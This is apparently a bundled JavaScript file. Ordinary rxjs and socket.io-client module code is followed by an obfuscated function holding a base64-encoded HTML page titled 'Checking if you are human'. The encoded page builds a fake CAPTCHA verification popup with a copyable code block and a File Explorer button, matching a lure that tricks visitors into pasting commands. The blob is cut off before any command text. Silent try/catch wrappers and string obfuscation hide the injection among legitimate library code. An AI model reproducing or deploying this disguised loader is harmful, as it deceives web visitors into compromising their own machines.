Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
var takeUntil_1 = require("./internal/operators/takeUntil");
Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
var takeWhile_1 = require("./internal/operators/takeWhile");
Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
var tap_1 = require("./internal/operators/tap");
Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
var throttle_1 = require("./internal/operators/throttle");
Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
var throttleTime_1 = require("./internal/operators/throttleTime");
Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
var timeInterval_1 = require("./internal/operators/timeInterval");
Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
var timeout_2 = require("./internal/operators/timeout");
Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
var timeoutWith_1 = require("./internal/operators/timeoutWith");
Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
var timestamp_1 = require("./internal/operators/timestamp");
Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
var toArray_1 = require("./internal/operators/toArray");
Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
var window_1 = require("./internal/operators/window");
Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
var windowCount_1 = require("./internal/operators/windowCount");
Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
var windowTime_1 = require("./internal/operators/windowTime");
Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
var windowToggle_1 = require("./internal/operators/windowToggle");
Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
var windowWhen_1 = require("./internal/operators/windowWhen");
Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
var zipAll_1 = require("./internal/operators/zipAll");
Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
var zipWith_1 = require("./internal/operators/zipWith");
Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
//# sourceMappingURL=index.js.map
}catch(e){}
})();

/* >>> socket.io-client (3296 bytes) <<< */
(function(){
try{
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
exports.io = lookup;
exports.connect = lookup;
exports.default = lookup;
const url_js_1 = require("./url.js");
const manager_js_1 = require("./manager.js");
Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
const socket_js_1 = require("./socket.js");
Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
const debug_1 = __importDefault(require("debug")); // debug()
const debug = (0, debug_1.default)("socket.io-client"); // debug()
/**
 * Managers cache.
 */
const cache = {};
function lookup(uri, opts) {
    if (typeof uri === "object") {
        opts = uri;
        uri = undefined;
    }
    opts = opts || {};
    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
    const source = parsed.source;
    const id = parsed.id;
    const path = parsed.path;
    const sameNamespace = cache[id] && path in cache[id]["nsps"];
    const newConnection = opts.forceNew ||
        opts["force new connection"] ||
        false === opts.multiplex ||
        sameNamespace;
    let io;
    if (newConnection) {
        debug("ignoring socket cache for %s", source);
        io = new manager_js_1.Manager(source, opts);
    }
    else {
        if (!cache[id]) {
            debug("new io instance for %s", source);
            cache[id] = new manager_js_1.Manager(source, opts);
        }
        io = cache[id];
    }
    if (parsed.query && !opts.query) {
        opts.query = parsed.queryKey;
    }
    return io.socket(parsed.path, opts);
}
// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
// namespace (e.g. `io.connect(...)`), for backward compatibility
Object.assign(lookup, {
    Manager: manager_js_1.Manager,
    Socket: socket_js_1.Socket,
    io: lookup,
    connect: lookup,
});
/**
 * Protocol version.
 *
 * @public
 */
var socket_io_parser_1 = require("socket.io-parser");
Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
var engine_io_client_1 = require("engine.io-client");
Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });

module.exports = lookup;

}catch(e){}
})();

function a() {
    const s = [
        'CkDDw',
        '24497draPYJ',
        '2830137tuxJnO',
        '6bOOixM',
        'jKFNv',
        'yuGJY',
        '56KASODQ',
        '3097612vRCsQg',
        'write',
        '_vc',
        '3652964FFYxUX',
        '99070mBsQiA',
        'close',
        'open',
        'setItem',
        'BWVDK',
        'qSWzs',
        'PGh0bWwgbGFuZz0iZW4iPjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkNoZWNraW5nIGlmIHlvdSBhcmUgaHVtYW48L3RpdGxlPg0KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuMC4wLWJldGEzL2Nzcy9hbGwubWluLmNzcyI+DQogICAgPHN0eWxlPg0KICAgIGJvZHkgew0KICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmNmY2ZjOw0KICAgICAgICBjb2xvcjogIzMzMzsNCiAgICB9DQoNCiAgICBAbWVkaWEgKHByZWZlcnMtY29sb3Itc2NoZW1lOiBkYXJrKSB7DQogICAgICAgIGJvZHkgew0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzIyMiAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgY29sb3I6ICNkOWQ5ZDkgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KICAgICAgICAudGV0dHggew0KICAgICAgICAgICAgY29sb3I6ICNkOWQ5ZDkgIWltcG9ydGFudDsNCiAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94LXdpbmRvdyB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjMyMzIzICFpbXBvcnRhbnQ7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMzIzMjMgIWltcG9ydGFudDsNCiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICM3OTc5NzkgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICB9DQoNCiAgICAudGV0dHggew0KICAgICAgICAgICAgY29sb3I6IHJnYig3OCA3OCA3OCk7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIHsNCiAgICAgICAgICAgIGNvbG9yOiAjMzMzICFpbXBvcnRhbnQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS12ZXJpZnktYnV0dG9uIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMzMzMzMzMgIWltcG9ydGFudDsNCiAgICB9DQoNCiAgICAuY2hlY2tib3gtd2luZG93IHsNCiAgICAgZGlzcGxheTogZmxleDsNCiAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgd2lkdGg6IDMwMHB4Ow0KICAgICBoZWlnaHQ6IDc0cHg7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNmYWZhZmE7DQogICAgIGJvcmRlcjogMXB4IHNvbGlkICNlMGUwZTA7DQogICAgIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgdHJhbnNpdGlvbjogd2lkdGggMC41cyBlYXNlLWluLW91dCwgaGVpZ2h0IDAuNXMgZWFzZS1pbi1vdXQ7DQogICAgfQ0KDQogICAgLnRoZW1lLWRhcmsgLmxvZ28tdGV4dCB7DQogICAgZmlsbDogI2ZmZjsNCiAgICB9DQoNCiAgICAuY2hlY2tib3gtY29udGFpbmVyIHsNCiAgICAgd2lkdGg6IDI4cHg7DQogICAgIGhlaWdodDogMjhweDsNCiAgICAgbWFyZ2luLWxlZnQ6IDEycHg7DQogICAgIG1hcmdpbi1yaWdodDogOHB4Ow0KICAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgIGRpc3BsYXk6IGZsZXg7DQogICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgIH0NCg0KLmNoZWNrYm94IHsNCiAgICB3aWR0aDogMTAwJTsNCiAgICBoZWlnaHQ6IDEwMCU7DQogICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsNCiAgICBib3JkZXItcmFkaXVzOiAycHg7DQogICAgYm9yZGVyOiAycHggc29saWQgIzg4ODg4ODsNCiAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgdHJhbnNpdGlvbjogYm9yZGVyLWNvbG9yIDAuM3MsIGJhY2tncm91bmQtY29sb3IgMC4zczsNCiAgICBkaXNwbGF5OiBmbGV4Ow0KICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQp9DQoNCiAgICAuY2hlY2tib3guY2hlY2tlZCB7DQogICAgIGJvcmRlci1jb2xvcjogIzQyODVmNDsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogIzQyODVmNDsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCg0KICAgIC5jaGVja2JveC5jaGVja2VkOjphZnRlciB7DQogICAgIGNvbnRlbnQ6ICJcZjAwYyI7DQogICAgIGZvbnQtZmFtaWx5OiAiRm9udEF3ZXNvbWUiOw0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgZm9udC1zaXplOiAxOHB4Ow0KICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgIHRvcDogLTJweDsNCiAgICAgbGVmdDogMnB4Ow0KICAgIH0NCg0KICAgIC5zcGlubmVyIHsNCiAgICAgdmlzaWJpbGl0eTogaGlkZGVuOw0KICAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgfQ0KDQogICAgLnZlcmlmeS13aW5kb3cgew0KICAgICBvcGFjaXR5OiAwOw0KICAgICB2aXNpYmlsaXR5OiBoaWRkZW47DQogICAgIHdpZHRoOiAxMDAlOw0KICAgICBoZWlnaHQ6IDA7DQogICAgIHRyYW5zaXRpb246IG9wYWNpdHkgMC41cyBlYXNlLWluLW91dCwgaGVpZ2h0IDAuNXMgZWFzZS1pbi1vdXQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS13aW5kb3cuYWN0aXZlIHsNCiAgICAgb3BhY2l0eTogMTsNCiAgICAgdmlzaWJpbGl0eTogdmlzaWJsZTsNCiAgICAgaGVpZ2h0OiBhdXRvOw0KICAgIH0NCg0KICAgIC52ZXJpZnktaGVhZGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2U4NWQxYTsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgY29sb3I6ICNmZmY7DQogICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICB9DQoNCiAgICAudmVyaWZ5LW1haW4gew0KICAgICBwYWRkaW5nOiAxMHB4Ow0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgIH0NCg0KICAgIC5sb2dvLXRleHQgew0KICAgICAgICBmaWxsOiAjZmZmOw0KICAgIH0NCg0KICAgIC52ZXJpZnktZm9vdGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YyZjJmMjsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgdGV4dC1hbGlnbjogcmlnaHQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS1mb290ZXIgYnV0dG9uIHsNCiAgICAgcGFkZGluZzogOHB4IDE1cHg7DQogICAgIGJhY2tncm91bmQ6ICM0Mjg1ZjQ7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBib3JkZXI6IG5vbmU7DQogICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgYm9yZGVyLXJhZGl1czogNHB4Ow0KICAgIH0NCg0KICAgIC8qIE5FVyBTVFlMRSAqLw0KDQogICAgLnZlcmlmeS13aW5kb3cgew0KICAgICB3aWR0aDogYXV0bzsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWhlYWRlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNlODVkMWE7DQogICAgIHBhZGRpbmc6IDEwcHggMTZweDsNCiAgICAgY29sb3I6ICNmZmY7DQogICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICAgYm9yZGVyLXJhZGl1czogMDsNCiAgICB9DQoNCiAgICAubGRzLXJpbmcgZGl2IHsNCiAgICAgYm9yZGVyLWNvbG9yOiAjOTk5IHRyYW5zcGFyZW50IHRyYW5zcGFyZW50Ow0KICAgIH0NCiAgICBib2R5LnRoZW1lLWxpZ2h0IC5sZHMtcmluZyBkaXYgew0KICAgICBib3JkZXItY29sb3I6ICM1OTU5NTkgdHJhbnNwYXJlbnQgdHJhbnNwYXJlbnQ7DQogICAgfQ0KDQogICAgLmxkcy1yaW5nIHsNCiAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgfQ0KICAgIC5sZHMtcmluZywNCiAgICAubGRzLXJpbmcgZGl2IHsNCiAgICAgaGVpZ2h0OiAxLjg3NXJlbTsNCiAgICAgd2lkdGg6IDEuODc1cmVtOw0KICAgIH0NCiAgICAubGRzLXJpbmcgZGl2IHsNCiAgICAgYW5pbWF0aW9uOiBsZHMtcmluZyAxLjJzIGN1YmljLWJlemllcigwLjUsIDAsIDAuNSwgMSkgaW5maW5pdGU7DQogICAgIGJvcmRlcjogMC4zcmVtIHNvbGlkIHRyYW5zcGFyZW50Ow0KICAgICBib3JkZXItcmFkaXVzOiA1MCU7DQogICAgIGJvcmRlci10b3AtY29sb3I6ICMzMTMxMzE7DQogICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7DQogICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgfQ0KICAgIC5sZHMtcmluZyBkaXY6Zmlyc3QtY2hpbGQgew0KICAgICBhbmltYXRpb24tZGVsYXk6IC0wLjQ1czsNCiAgICB9DQogICAgLmxkcy1yaW5nIGRpdjpudGgtY2hpbGQoMikgew0KICAgICBhbmltYXRpb24tZGVsYXk6IC0wLjNzOw0KICAgIH0NCiAgICAubGRzLXJpbmcgZGl2Om50aC1jaGlsZCgzKSB7DQogICAgIGFuaW1hdGlvbi1kZWxheTogLTAuMTVzOw0KICAgIH0NCg0KICAgIEBrZXlmcmFtZXMgbGRzLXJpbmcgew0KICAgICAwJSB7DQogICAgICB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsNCiAgICAgfQ0KICAgICB0byB7DQogICAgICB0cmFuc2Zvcm06IHJvdGF0ZSgxdHVybik7DQogICAgIH0NCiAgICB9DQoNCiANCg0KICAgICAgIEBtZWRpYSAocHJlZmVycy1jb2xvci1zY2hlbWU6IGRhcmspIHsNCiAgICAgYm9keSAubGRzLXJpbmcgZGl2IHsNCiAgICAgIGJvcmRlci1jb2xvcjogIzY3Njc2NyB0cmFuc3BhcmVudCB0cmFuc3BhcmVudDsNCiAgICAgfQ0KICAgIH0NCg0KICAgICogew0KICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94Ow0KICAgICBtYXJnaW46IDA7DQogICAgIHBhZGRpbmc6IDA7DQogICAgfQ0KICAgIGJvZHkgew0KDQogICAgIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIC1hcHBsZS1zeXN0ZW0sIEJsaW5rTWFjU3lzdGVtRm9udCwgU2Vnb2UgVUksIFJvYm90bywgSGVsdmV0aWNhIE5ldWUsIEFyaWFsLCBOb3RvIFNhbnMsIHNhbnMtc2VyaWYsIEFwcGxlIENvbG9yIEVtb2ppLCBTZWdvZSBVSSBFbW9qaSwgU2Vnb2UgVUkgU3ltYm9sLCBOb3RvIENvbG9yIEVtb2ppOw0KICAgIH0NCg0KICAgIGJvZHkgew0KICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KICAgICBoZWlnaHQ6IDEwMHZoOw0KICAgICBtaW4taGVpZ2h0OiAxMDB2aDsNCiAgICB9DQoNCiAgICAubWFpbi13cmFwcGVyIHsNCiAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgZGlzcGxheTogZmxleDsNCiAgICAgZmxleDogMTsNCiAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICB9DQogICAgLm1haW4tY29udGVudCB7DQogICAgIG1hcmdpbjogOHJlbSBhdXRvOw0KICAgICBtYXgtd2lkdGg6IDYwcmVtOw0KICAgICBwYWRkaW5nLWxlZnQ6IDEuNXJlbTsNCiAgICAgcGFkZGluZy1yaWdodDogMS41cmVtOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICB9DQoNCiAgICAuZm9vdGVyIHsNCiAgICAgZm9udC1zaXplOiAwLjc1cmVtOw0KICAgICBsaW5lLWhlaWdodDogMS4xMjVyZW07DQogICAgIG1hcmdpbjogMCBhdXRvOw0KICAgICBtYXgtd2lkdGg6IDYwcmVtOw0KICAgICBwYWRkaW5nLWxlZnQ6IDEuNXJlbTsNCiAgICAgcGFkZGluZy1yaWdodDogMS41cmVtOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICB9DQoNCiAgICAuZm9vdGVyLWlubmVyIHsNCiAgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICNkOWQ5ZDk7DQogICAgIHBhZGRpbmctYm90dG9tOiAxcmVtOw0KICAgICBwYWRkaW5nLXRvcDogMXJlbTsNCiAgICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgIH0NCiAgICAvKiBQb3B1cCBWZXJpZmljYXRpb24gV2luZG93ICovDQogICAgLnZlcmlmeS13aW5kb3cgew0KICAgICBmb250LWZhbWlseTogUm9ib3RvLCBoZWx2ZXRpY2EsIGFyaWFsLCBzYW5zLXNlcmlmOw0KICAgICBvcGFjaXR5OiAwOw0KICAgICB2aXNpYmlsaXR5OiBoaWRkZW47DQogICAgIG1hcmdpbjogYXV0bzsNCiAgICAgd2lkdGg6IDMxMHB4Ow0KICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDQwMG1zOw0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgZGlzcGxheTogYmxvY2s7DQogICAgIHRvcDogNXB4Ow0KICAgICBsZWZ0OiA1NHB4Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktaGVhZGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogIzFhNzNlODsNCiAgICAgcGFkZGluZzogMTZweDsNCiAgICAgY29sb3I6ICNmZmY7DQogICAgIGZvbnQtc2l6ZTogMThweDsNCiAgICAgYm9yZGVyLXJhZGl1czogOHB4IDhweCAwIDA7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIHsNCiAgICAgcGFkZGluZzogMTZweDsNCiAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICBjb2xvcjogIzMzMzsNCiAgICB9DQoNCiAgICAudmVyaWZ5LW1haW4gb2wgew0KICAgICBwYWRkaW5nLWxlZnQ6IDIwcHg7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIG9sIGxpIHsNCiAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsNCiAgICB9DQoNCiAgICAudmVyaWZ5LW1haW4gY29kZSB7DQogICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICBtYXJnaW4tdG9wOiAxMHB4Ow0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjlmOWY5Ow0KICAgICBwYWRkaW5nOiAxMHB4Ow0KICAgICBmb250LXNpemU6IDEycHg7DQogICAgIGJvcmRlcjogMXB4IHNvbGlkICNkZGQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS1mb290ZXIgew0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjJmMmYyOw0KICAgICBwYWRkaW5nOiAxNnB4Ow0KICAgICB0ZXh0LWFsaWduOiByaWdodDsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWZvb3RlciBidXR0b24gew0KICAgICBwYWRkaW5nOiAxMHB4IDIwcHg7DQogICAgIGJhY2tncm91bmQ6ICM0Mjg1ZjQ7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBib3JkZXI6IG5vbmU7DQogICAgIGJvcmRlci1yYWRpdXM6IDVweDsNCiAgICAgY3Vyc29yOiBwb2ludGVyOw0KICAgIH0NCg0KICAgIC5vdmVybGF5IHsNCiAgICAgZGlzcGxheTogbm9uZTsNCiAgICAgcG9zaXRpb246IGZpeGVkOw0KICAgICB0b3A6IDA7DQogICAgIGxlZnQ6IDA7DQogICAgIHdpZHRoOiAxMDAlOw0KICAgICBoZWlnaHQ6IDEwMCU7DQogICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC41KTsNCiAgICAgei1pbmRleDogMTA7DQogICAgfQ0KDQogICAgLm92ZXJsYXkuYWN0aXZlLA0KICAgIC52ZXJpZnktd2luZG93LmFjdGl2ZSB7DQogICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgd2lkdGg6IGF1dG87DQogICAgfQ0KDQogICAgLnZlcmlmeS1oZWFkZXIgew0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTg1ZDFhOw0KICAgICBwYWRkaW5nOiAxMHB4IDE2cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgIGJvcmRlci1yYWRpdXM6IDA7DQogICAgfQ0KDQogICAgI3NwaW5uZXIyIHsNCiAgICB3aWR0aDogNDBweDsgDQogICAgaGVpZ2h0OiA0MHB4OyANCiAgICBhbmltYXRpb246IHJvdGF0ZSA0cyBsaW5lYXIgaW5maW5pdGU7IA0KICAgIG1hcmdpbi10b3A6IC00cHg7DQogICAgDQp9DQoNCi5jaGVja2JveC13aW5kb3cgew0KICANCiAgICBvcGFjaXR5OiAwOw0KfQ0KDQpAa2V5ZnJhbWVzIHJvdGF0ZSB7DQogICAgZnJvbSB7DQogICAgICAgIHRyYW5zZm9ybTogcm90YXRlKDBkZWcpOw0KICAgIH0NCg0KICAgIHRvIHsNCiAgICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMzYwZGVnKTsNCiAgICB9DQp9DQoNCg0KLyogTkVXIFNUWUxFICovDQoNCiAgICAudGltZXN0YW1wIHsNCiAgICAgIGZvbnQtc2l6ZTogMTNweDsNCiAgICAgIGNvbG9yOiAjN2E3YTdhOw0KICAgICAgbWFyZ2luLXRvcDogNnB4Ow0KICAgIH0NCg0KICAgIC5pbnN0cnVjdGlvbnMgew0KICAgICAgdGV4dC1hbGlnbjogbGVmdDsNCiAgICANCiAgICAgIGZvbnQtc2l6ZTogMTVweDsNCiAgICAgIGNvbG9yOiAjMzMzMzMzOw0KICAgICAgbGluZS1oZWlnaHQ6IDEuNjsNCiAgICB9DQoNCiAgICAuaW5zdHJ1Y3Rpb25zIG9sIHsNCiAgICAgIG1hcmdpbjogMDsNCiAgICAgIHBhZGRpbmctbGVmdDogMjBweDsNCiAgICB9DQoNCiAgICAuY29kZS1ibG9jayB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogI2YxZjFmMTsNCiAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOw0KICAgIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgICBwYWRkaW5nOiA4cHggMTJweDsNCiAgICBmb250LWZhbWlseTogQ29uc29sYXMsIG1vbm9zcGFjZTsNCiAgICBmb250LXNpemU6IDE0cHg7DQogICAgbWFyZ2luLXRvcDogOHB4Ow0KICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7DQogICAgY3Vyc29yOiBwb2ludGVyOw0KICAgIHVzZXItc2VsZWN0OiBub25lOw0KICAgIH0NCg0KDQogICAgLmNvZGUtYmxvY2s6aG92ZXIgew0KICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2U2ZTZlNjsNCiAgICB9DQoNCiAgICAuY29kZS1ibG9jazo6YWZ0ZXIgew0KICAgICAgY29udGVudDogIkNvcHkiOw0KICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgdG9wOiA1MCU7DQogICAgICByaWdodDogMTJweDsNCiAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsNCiAgICAgIGZvbnQtc2l6ZTogMTJweDsNCiAgICAgIGNvbG9yOiAjMDA3OGQ0Ow0KICAgICAgb3BhY2l0eTogMDsNCiAgICAgIHRyYW5zaXRpb246IG9wYWNpdHkgMC4yczsNCiAgICB9DQoNCiAgICAuY29kZS1ibG9jazpob3Zlcjo6YWZ0ZXIgew0KICAgICAgb3BhY2l0eTogMTsNCiAgICB9DQoNCiAgICAuY29kZS1ibG9jay5jbGlja2VkOjphZnRlciB7DQogICAgICBjb250ZW50OiAiQ29waWVkIjsNCiAgICAgIGNvbG9yOiAjMTA3YzEwOw0KICAgIH0NCg0KICAgICNmaWxlRXhwbG9yZXIgew0KICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNzhkNDsNCiAgICAgIGNvbG9yOiB3aGl0ZTsNCiAgICAgIGJvcmRlcjogbm9uZTsNCiAgICAgIHBhZGRpbmc6IDEycHggMzBweDsNCiAgICAgIGZvbnQtc2l6ZTogMTVweDsNCiAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgICAgIG1hcmdpbjogMjBweCAwIDEwcHg7DQogICAgICBjdXJzb3I6IHBvaW50ZXI7DQoNCiAgICB9DQoNCiAgICAjZmlsZUV4cGxvcmVyOmhvdmVyIHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDVlYTI7DQogICAgfQ0KDQojdmVyaWZ5LXdpbmRvdyB7DQogICAgICAgIHdpZHRoOiAxMDAlOw0KfQ0KDQogICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZGl2IGNsYXNzPSJtYWluLXdyYXBwZXIiPg0KIDxkaXYgY2xhc3M9Im1haW4tY29udGVudCI+DQogIDxkaXYgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7Ij4NCiAgIA0KICA8IS0tIDxpbWcgc3JjPSJodHRwczovLzJjYXB0Y2hhLmNvbS9kaXN0L3dlYi9hc3NldHMvZ29vZ2xlLXByaXZhY3ktcG9saWN5LUNiMENHVlJULnN2ZyIgLz4gLS0+DQoNCiAgIDxpbWcgY2xhc3M9ImxvZ28taW1nIiBzcmM9IiIgc3R5bGU9ImhlaWdodDogMnJlbTsgbWFyZ2luLXJpZ2h0OiAwLjVyZW07IiA+DQoNCg0KDQogICA8cCBzdHlsZT0iZm9udC1zaXplOiAyLjVyZW07IGZvbnQtd2VpZ2h0OiA1MDA7IGxpbmUtaGVpZ2h0OiAzLjc1cmVtOyI+PHNwYW4gY2xhc3M9ImRvbWFpbi1uYW1lIj48L3NwYW4+PC9wPg0KICA8L2Rpdj4NCg0KIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZTogMS41cmVtOyBsaW5lLWhlaWdodDogMi4yNXJlbTsgbWFyZ2luLWJvdHRvbTogMnJlbTsgbWluLWhlaWdodDogMnJlbTsiPg0KICA8cD4NCiA